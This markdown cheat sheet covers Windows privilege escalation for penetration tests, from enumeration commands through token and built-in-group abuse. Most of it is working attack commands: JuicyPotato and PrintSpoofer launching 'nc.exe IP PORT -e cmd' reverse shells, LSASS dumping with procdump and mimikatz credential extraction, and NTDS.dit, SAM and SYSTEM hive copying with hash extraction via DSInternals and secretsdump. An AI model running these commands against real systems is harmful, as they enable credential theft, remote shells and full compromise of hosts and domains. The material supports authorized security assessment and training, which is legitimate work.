# Windows Host Privilege Escalation

- The general goal of Windows privilege escalation is to further our access to a given system to a member of the `Local Administrators group` or the `NT AUTHORITY\SYSTEM` LocalSystem account.

- In some cases, privilege escalation may be the ultimate goal of the assessment if our client hires us for a "gold image" or "workstation breakout" type assessment. 

- We can escalate privileges to one of the following depending on the system configuration and what type of data we encounter:

- The highly privileged `NT AUTHORITY\SYSTEM` account, or `LocalSystem` account which is a highly privileged account with more privileges than a local administrator account and is used to run most Windows services.
- The built-in local `administrator` account. Some organizations disable this account, but many do not. It is not uncommon to see this account reused across multiple systems in a client environment.
- Another local account that is a member of the `local Administrators` group. Any account in this group will have the same privileges as the built-in administrator account.
- A standard (non-privileged) domain user who is part of the local Administrators group.
- A domain admin (highly privileged in the Active Directory environment) that is part of the local Administrators group.


### Network Information

```shell
ipconfig /all
arp -a
route print
```

### System Information

```shell
# To View tasks list
tasklist /svc

# View env variable
set
Get-ChildItem Env:

# System info
systeminfo

# Patches and updates
wmic qfe
Get-HotFix | ft -AutoSize

# Installed programs
wmic product get name
Get-WmiObject -Class Win32_Product |  select Name, Version

# Active connections
# Focus on entries listening on loopback addresses
netstat -ano

# Users & Groups information
query user  # logged in users
net user    # all users
net localgroup  # all groups
net localgroup administrators   # details about group
net accounts    # password policy and other info

echo %USERNAME%     # username
whoami
whoami /priv    # User privileges
whoami /group # User group information
```

### Named Pipe Attack

- We can use lax permissions assigned to named pipes to escalate privileges on the host to SYSTEM.

```shell
# List named pipes
pipelist.exe /accepteula
gci \\.\pipe\

# Reviewing named pipe permissions
accesschk.exe /accepteula \\.\Pipe\lsass -v
accesschk.exe -accepteula -w \pipe\WindscribeService -v
```

## Windows User Privileges

- Privileges in Windows are rights that an account can be granted to perform a variety of operations
on the local system such as managing services, loading drivers, shutting down the system, debugging
an application, and more.

- Privileges are different from access rights, which a system uses to grant or deny access to securable objects.


### SeImpersonate and SeAssignPrimaryToken

- In Windows, every process has a token that has information about the account that is running it.
- These tokens are not considered secure resources, as they are just locations within memory that
could be brute-forced by users that cannot read memory.

- Legitimate programs may utilize another process's token to escalate from Administrator to Local
System, which has additional privileges. Processes generally do this by making a call to the 
WinLogon process to get a SYSTEM token, then executing itself with that token placing it within
the SYSTEM space. 
- Attackers often abuse this privilege in the "Potato style" privescs - where a
service account can SeImpersonate, but not obtain full SYSTEM level privileges.

```shell
# Juicy potato
# https://github.com/ohpe/juicy-potato
JuicyPotato.exe -l <COM Server Port> -p <command> -a <arguments> -t <CreateProcessWithTokenW or CreateProcessAsUser>
JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe IP PORT -e cmd.exe" -t *

# PrintSpoofer and RoguePotato
# For Windows Server 2019 and Windows 10 build 1809 onwards
PrintSpoofer.exe -c <command>
PrintSpoofer.exe -c "c:\tools\nc.exe IP PORT -e cmd"
```

### SeDebugPrivilege

- This privilege can be used to capture sensitive information from system memory, or access/modify
kernel and application structures.

```shell
# Dump LSASS 
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Get NTLM hashes using mimikatz
mimikatz.exe
"mimikatz # log"
"mimikatz # sekurlsa::minidump lsass.dmp"
"mimikatz # sekurlsa::logonpasswords"
```
- We can elevate our privileges to SYSTEM by launching a child process and using the elevated rights 
granted to our account via SeDebugPrivilege to alter normal system behavior to inherit the token of
a parent process and impersonate it.

```shell
# PoC Script: https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1
.\pocscript.ps1;[MyProcess]::CreateProcessFromParent((Get-Process "lssas").ID,<command_to_execute>,"")
```

### SeTakeOwnershipPrivilege

- SeTakeOwnershipPrivilege grants a user the ability to take ownership of any "securable object,"
meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and 
processes. This privilege assigns WRITE_OWNER rights over an object, meaning the user can change 
the owner within the object's security descriptor.

- These privileges can also be used to escalate privileges:
`SeBackupPrivilege, SeRestorePrivilege, and SeSecurityPrivilege`

- Sometimes this privilege can be disabled. So, we have to enable it first.

```shell
# PoC Script: https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
```

- We can change ownership of some important file and read it.

```shell
# Checking file permissions
cmd /c dir /q <filepath>
# Take ownership of the file
takeown /f <filepath>
# Modify file's ACL
icacls <filepath> /grant $USER:F
```

- Interesting files:

```shell
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
.kdbx
```

## Windows Built-in Groups

### Backup Operators

- Membership of this group grants its members the `SeBackup` and `SeRestore` privileges.

```shell
# PoC Script: https://github.com/giuliano108/SeBackupPrivilege
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

# Enable SeBackup Privilege if disabled
Get-SeBackupPrivilege
Set-SeBackupPrivilege

# Create backup of file and read it
Copy-FileSeBackupPrivilege <filepath> <backup  path>
```
- Copying `NTDS.dit`

```shell
# Backup NTDS.dit
robocopy /B E:\Windows\NTDS .\ntds ntds.dit

# Alternate:

# Run diskshadow tool
diskshadow.exe

# Creating baackup of C drive
DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit

# Creating backup of NTDS.dit
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit <backup path>
```

- Extracting credentials from NTDS.dit file

```shell
# This privilege also allows us to backup SAM
# and SYSTEM registry hives
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV

# Extracting credentials from NTDS.dit
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=$DOMAIN,DC=local' -DBPath <.\ntds.dit path> -BootKey $key
# From linux
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

### Event Log Readers

- Administrators or members of the Event Log Readers group have permission to access logs.

```shell
# Searching Security Logs Using wevtutil
wevtutil qe Security /rd:true /f:text | Select-String "/user"
wevtutil qe Security /rd:true /f:text /r:share01 /u:j$USER /p:$PASS | findstr "/user"

# Searching Security Logs Using Get-WinEvent
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

### DNS Admins
coming soon